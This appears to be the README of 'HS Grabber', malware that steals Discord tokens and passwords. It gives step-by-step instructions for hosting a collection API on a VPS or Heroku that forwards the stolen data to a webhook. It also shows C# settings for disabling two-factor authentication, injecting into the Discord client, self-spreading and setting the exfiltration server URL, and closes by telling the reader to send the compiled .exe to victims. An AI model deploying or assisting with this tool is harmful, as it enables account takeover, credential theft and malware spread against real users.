# HS Grabber
An powerful discord token grabber / discord token stealer stole discord password, info, etc, same when you change password.

# How to use

## #1 : API Hosting

### Method 1 : (require an vps)

Open port 80

Install Apache2 : 
```
$ sudo apt-get update
$ sudo apt-get install apache2
```

Test server : 

```
$ curl urserverurl
```

Configure Firewall :
```
$ sudo ufw allow 'Apache'
```

Verify the change :
```
$ sudo ufw status
```

Install API :
```
$ git clone https://github.com/Stanley-GF/api.git
```

Configure port & ip in the main index.js
```
$ cd api
$ nano index.js
```

Configure webhook url : 
```
$ cd api/endpoints
$ nano index.js
```

Your API URL gonna be : 
https://your-vps-ip/api/v1/send (replace your-vps-ip by ur real vps ip, obviously)

### Method 2 : Heroku (the best for beginner)

* Start https://heroku.com
* Signup an account
* Create an app
* Fork https://github.com/Stanley-GF/api on your github account
* Go in endpoints -> index.js -> edit and replace the webhook url by your webhook url
* Go in https://dashboard.heroku.com/apps/ , click on your app, go in "deploy" category
* In deployment method, select Github, login in your github account by authorize OAuth thing -> in App Connected, type "api" and select your project
* Enable "Automatic Deploy"
* press on Deploy Branch
* your server url gonna be : https://your-app-name.herokuapp.com/api/v1/send (replace your-app-name by ur real app name, obviously)

## #2 : Your .exe

* Download src of this project
* Open project
* Go in settings.cs and configure option : 

```cs

		public static bool disableMfa = false; // disable 2FA 

		public static bool restartDiscord = true; // restart discord after injection

		public static bool spread = true; // ALWAYS TRUE : (for infect client)

		private static string serverurl = "https://your-app-name.herokuapp.com/api/v1/send"; // replace "your-app-name.herokuapp.com/api/v1/send" by your api url

		public static string Url = "https://cors-anywhere2.herokuapp.com/" + serverurl; // don't tuch.
```

* Compile the project
* Go in `\HS-Grabber\HS-Grabber\bin\Debug`
* Send the .exe to victims ! 

# Some screenshot of the grabber

![yay](https://cdn.discordapp.com/attachments/797933407476777012/798145821203628052/unknown.png)
